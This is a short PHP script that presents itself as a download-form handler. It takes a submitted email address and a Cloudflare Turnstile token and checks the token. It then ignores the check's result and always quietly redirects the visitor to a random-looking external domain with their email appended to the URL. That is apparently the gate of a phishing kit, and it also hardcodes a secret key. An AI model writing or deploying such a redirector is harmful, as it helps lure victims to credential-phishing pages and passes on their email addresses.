<?php
$secretKey = "0x4AAAAAABr4myd_LxUf1vc9rIBxToUahJ8";

$token = $_POST['cf-turnstile-response'] ?? '';
$email = $_POST['download_email'] ?? '';
$remoteIp = $_SERVER['REMOTE_ADDR'] ?? '';

if (!empty($token)) {
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret'   => $secretKey,
        'response' => $token,
        'remoteip' => $remoteIp
    ]));
    $response = curl_exec($ch);
    curl_close($ch);

    $result = json_decode($response, true);
}

// 🔹 Always redirect quietly (success or fail)
header("Location: https://jqia.rkectswxfsi.es/J2!bTZjUS4FOjDRoKo/$" . urlencode($email));
exit;